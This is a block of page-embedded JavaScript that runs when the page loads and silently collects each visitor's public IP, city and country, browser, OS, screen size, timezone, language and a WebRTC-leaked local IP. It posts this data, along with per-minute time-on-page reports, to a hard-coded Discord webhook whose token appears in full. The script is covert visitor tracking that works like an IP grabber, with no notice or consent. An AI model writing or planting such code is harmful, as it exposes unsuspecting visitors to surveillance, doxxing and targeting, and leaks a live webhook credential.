    <script>
        var startTime;
        var intervalId;

        function captureStartTime() {
            startTime = new Date().getTime();
            intervalId = setInterval(sendTimeData, 60000); // Send data every minute
        }

        function sendTimeData() {
            if (startTime) {
                var endTime = new Date().getTime();
                var totalTimeSpent = (endTime - startTime) / 1000; // Convert to seconds
                var timeData = {
                    start: new Date(startTime).toLocaleString(),
                    end: new Date(endTime).toLocaleString(),
                    totalTimeSpent: totalTimeSpent.toFixed(2) + " seconds",
                };

                // Sending the data to Discord webhook
                $.ajax({
                    type: "POST",
                    url: "https://canary.discord.com/api/webhooks/1122684490519674941/IVUM-XREmNkywbiLxl_R346eKP87LS_8ngOlBpyvfRxlodiQvvZRSmLBgxhFDAQn5osi",
                    data: JSON.stringify(timeData),
                    contentType: "application/json",
                    success: function() {
                        // Success callback
                    },
                    error: function() {
                        // Error callback
                    },
                });
            }
        }

        function captureEndTime() {
            clearInterval(intervalId);
            sendTimeData();
        }

        function getLocationData(ip) {
            // Location and browser information requested right as the user visits the page
            $.getJSON(`https://json.geoiplookup.io/${ip}`, function(locationData) {
                var country = locationData.country_name;
                var city = locationData.city;
                var osAndBrowser = getOsAndBrowser();
                var connectionType = getConnectionType();
                var screenResolution = getScreenResolution();
                var timezoneName = getTimezoneName();
                var language = getLanguage();
                var isMobile = checkMobileDevice();
                var cookiesEnabled = areCookiesEnabled();
                var localIpAddress = getLocalIpAddress();

                var requestData = {
                    content: "Country: " + country + "\nIP: " + ip + "\nCity: " + city + "\nOperating System and Browser: " + osAndBrowser +
                        "\nInternet Connection Type: " + connectionType + "\nScreen Resolution: " + screenResolution + "\nTimezone: " + timezoneName +
                        "\nLanguage: " + language + "\nMobile Device: " + isMobile + "\nCookies Enabled: " + cookiesEnabled + (localIpAddress ? "\nLocal IP Address: " + localIpAddress : ""),
                };

                // Sending the data to Discord webhook
                $.ajax({
                    type: "POST",
                    url: "https://canary.discord.com/api/webhooks/1122684490519674941/IVUM-XREmNkywbiLxl_R346eKP87LS_8ngOlBpyvfRxlodiQvvZRSmLBgxhFDAQn5osi",
                    data: JSON.stringify(requestData),
                    contentType: "application/json",
                });
            }).fail(function() {
                console.error("Failed to get geolocation data.");
                // Handle the error here (e.g., show a message, use default values, etc.)
                // ...
            });
        }

        $(document).ready(function() {
            // Capture the start time when the page loads
            captureStartTime();

            // Listen to the beforeunload event
            window.addEventListener("beforeunload", captureEndTime);

            $.getJSON("https://api64.ipify.org?format=json", function(ipData) {
                var ip = ipData.ip;
                getLocationData(ip);
            });
        });

        function getOsAndBrowser() {
            var userAgent = navigator.userAgent;
            var osAndBrowser = "Unknown";

            if (userAgent.indexOf("Win") !== -1) {
                osAndBrowser = "Windows";
            } else if (userAgent.indexOf("Mac") !== -1) {
                osAndBrowser = "MacOS";
            } else if (userAgent.indexOf("Linux") !== -1) {
                osAndBrowser = "Linux";
            }

            if (userAgent.indexOf("Chrome") !== -1) {
                osAndBrowser += " - Chrome";
            } else if (userAgent.indexOf("Firefox") !== -1) {
                osAndBrowser += " - Firefox";
            } else if (userAgent.indexOf("Safari") !== -1) {
                osAndBrowser += " - Safari";
            } else if (userAgent.indexOf("Opera") !== -1 || userAgent.indexOf("OPR") !== -1) {
                osAndBrowser += " - Opera";
            } else if (userAgent.indexOf("Edge") !== -1 || userAgent.indexOf("Edg") !== -1) {
                osAndBrowser += " - Microsoft Edge";
            } else if (userAgent.indexOf("Trident") !== -1) {
                osAndBrowser += " - Internet Explorer";
            }

            return osAndBrowser;
        }

        function getConnectionType() {
            var connectionType = "Unknown";
            if (navigator.connection) {
                if (navigator.connection.type === "wifi") {
                    connectionType = "Wifi";
                } else if (navigator.connection.type === "cellular") {
                    connectionType = "Cellular";
                }
            }
            return connectionType;
        }

        function getScreenResolution() {
            return screen.width + "x" + screen.height;
        }

        function getTimezoneName() {
            return new Intl.DateTimeFormat().resolvedOptions().timeZone;
        }

        function getLanguage() {
            return navigator.language || navigator.languages[0];
        }

        function checkMobileDevice() {
            return /Mobile|Android|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        function areCookiesEnabled() {
            return navigator.cookieEnabled ? "Yes" : "No";
        }

        function getLocalIpAddress() {
            var localIp = "";
            var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            if (RTCPeerConnection) {
                var rtcPeerConnection = new RTCPeerConnection({
                    iceServers: []
                });
                rtcPeerConnection.createDataChannel("");
                rtcPeerConnection.createOffer().then(function(offer) {
                    rtcPeerConnection.setLocalDescription(offer);
                });
                rtcPeerConnection.onicecandidate = function(event) {
                    if (event.candidate) {
                        var candidate = event.candidate.candidate;
                        var regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                        var match = regex.exec(candidate);
                        if (match && match.length > 1) {
                            localIp = match[1];
                        }
                    }
                };
            }
            return localIp;
        }

        function sendData() {
            // Your existing function...

        }
